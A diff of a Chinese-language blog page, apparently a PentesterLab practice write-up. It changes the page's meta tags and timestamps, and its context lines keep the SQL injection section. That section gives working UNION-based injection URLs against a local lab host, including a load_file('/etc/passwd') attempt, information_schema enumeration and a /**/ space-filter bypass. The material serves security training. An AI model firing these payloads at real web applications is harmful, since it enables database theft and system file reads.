@@ -5,17 +5,16 @@
   
   <title>Pentester Lab Writeup | Hc1m1</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description">
+  <meta name="description" content="玩了下exploit, 再来玩玩pentest。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Pentester Lab Writeup">
 <meta property="og:url" content="http://0x48.pw/2016/03/21/0x15/index.html">
 <meta property="og:site_name" content="Hc1m1">
-<meta property="og:description">
-<meta property="og:image" content="http://0x48.pw/img/pent.png">
-<meta property="og:updated_time" content="2016-03-28T07:55:38.430Z">
+<meta property="og:description" content="玩了下exploit, 再来玩玩pentest。">
+<meta property="og:updated_time" content="2016-03-28T10:18:36.674Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pentester Lab Writeup">
-<meta name="twitter:description">
+<meta name="twitter:description" content="玩了下exploit, 再来玩玩pentest。">
   
     <link rel="alternative" href="/atom.xml" title="Hc1m1" type="application/atom+xml">
   
@@ -303,7 +302,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><img src="/img/pent.png" alt="pentest"><br><a id="more"></a><br>玩了下exploit, 再来玩玩pentest。</p>
+        <blockquote>
+<p>玩了下exploit, 再来玩玩pentest。</p>
+</blockquote>
+<a id="more"></a>
 <h1 id="SQLI">SQLI</h1><h2 id="Example_1">Example 1</h2><p>没做任何过滤，简单。。不过看了下，mysql的用户没啥权限，所以最多就是查看数据库信息了，没法读系统文件，写文件getshell。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example1.php?name=admin<span class="number">%27</span><span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>version(),load_file(<span class="number">%22</span>/etc/passwd<span class="number">%22</span>),user(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Example_2">Example 2</h2><p>这题就过滤了空格呗。。也简单。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/sqli/example2.php?name=root%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="operator"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>SCHEMA_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.SCHEMATA%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>TABLE_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">TABLES</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=%<span class="number">22</span>exercises%<span class="number">22</span>%<span class="number">23</span></span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Example_3">Example 3</h2><p>只能说上题的payload还能用。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example3.php?name=root%<span class="number">27</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="function">user</span>(),<span class="function">database</span>(),<span class="function">version</span>(),<span class="number">4</span>,<span class="number">5%</span><span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
@@ -369,7 +371,7 @@
         <p><span>本文标题:</span><a href="/2016/03/21/0x15/">Pentester Lab Writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
         <p><span>发布时间:</span>2016-03-21, 10:16:46</p>
-        <p><span>最后更新:</span>2016-03-28, 15:55:38</p>
+        <p><span>最后更新:</span>2016-03-28, 18:18:36</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/03/21/0x15/" title="Pentester Lab Writeup">http://0x48.pw/2016/03/21/0x15/</a>
             <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/03/21/0x15/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
